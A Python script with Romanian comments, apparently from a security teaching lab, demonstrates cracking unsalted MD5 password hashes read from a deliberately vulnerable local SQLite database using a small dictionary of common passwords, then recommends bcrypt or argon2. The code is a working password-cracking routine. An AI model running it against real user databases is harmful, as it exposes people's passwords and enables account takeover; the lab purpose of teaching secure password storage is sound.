"""
ATAC 4.2 — Stocare nesigura a parolelor (MD5 fara salt)
=========================================================
Demonstreaza ca hash-urile MD5 din baza de date pot fi
sparte trivial cu un rainbow table / dictionar de parole.

Vulnerabilitate: parolele sunt stocate ca MD5(parola) fara salt.
Impact: daca un atacator obtine acces la DB, poate recupera
        parolele in text clar in cateva secunde.
"""

import sqlite3
import hashlib
import os

DB_PATH = os.path.join(os.path.dirname(__file__), "..", "v1_vulnerable", "authx_v1.db")

# Rainbow table simulat: parole comune -> hash MD5 precalculat
RAINBOW_TABLE = {}
PAROLE_COMUNE = [
    "1", "a", "12", "abc", "1234", "12345", "123456",
    "password", "qwerty", "letmein", "admin", "root",
    "test", "user", "pass", "welcome", "login",
    "111111", "000000", "iloveyou", "monkey", "dragon",
]

# Precalculam hash-urile
for p in PAROLE_COMUNE:
    h = hashlib.md5(p.encode()).hexdigest()
    RAINBOW_TABLE[h] = p

print("=" * 60)
print("  ATAC 4.2 — Cracare hash-uri MD5 cu rainbow table")
print("=" * 60)
print(f"  Target DB: {os.path.abspath(DB_PATH)}")
print(f"  Rainbow table: {len(RAINBOW_TABLE)} intrari")
print("=" * 60)

# Citim utilizatorii direct din DB (acces simulat la baza de date)
try:
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    users = conn.execute("SELECT id, email, password_hash FROM users").fetchall()
    conn.close()
except Exception as e:
    print(f"[!] Eroare la conectare DB: {e}")
    exit(1)

if not users:
    print("[!] Nu exista utilizatori in DB.")
    print("[!] Ruleaza mai intai attack_4_1_weak_passwords.py")
    exit(1)

print(f"\n  Utilizatori gasiti in DB: {len(users)}\n")
print(f"  {'Email':<30} {'Hash MD5':<35} {'Parola sparta'}")
print("  " + "-" * 80)

sparti = 0
for user in users:
    email = user["email"]
    hash_val = user["password_hash"]
    parola_clara = RAINBOW_TABLE.get(hash_val, None)

    if parola_clara:
        sparti += 1
        status = f"SPARTA → '{parola_clara}'"
    else:
        status = "necunoscuta"

    print(f"  {email:<30} {hash_val:<35} {status}")

print()
print("=" * 60)
print(f"  Rezultat: {sparti}/{len(users)} parole sparte instant")
print("=" * 60)
print()
print("[!] Concluzie: MD5 fara salt este complet nesigur.")
print("[!] Hash-urile pot fi gasite instant in tabele precalculate.")
print("[!] Ex: https://crackstation.net poate sparge MD5 in <1s.")
print("[!] Fix: foloseste bcrypt / argon2 cu salt automat.")
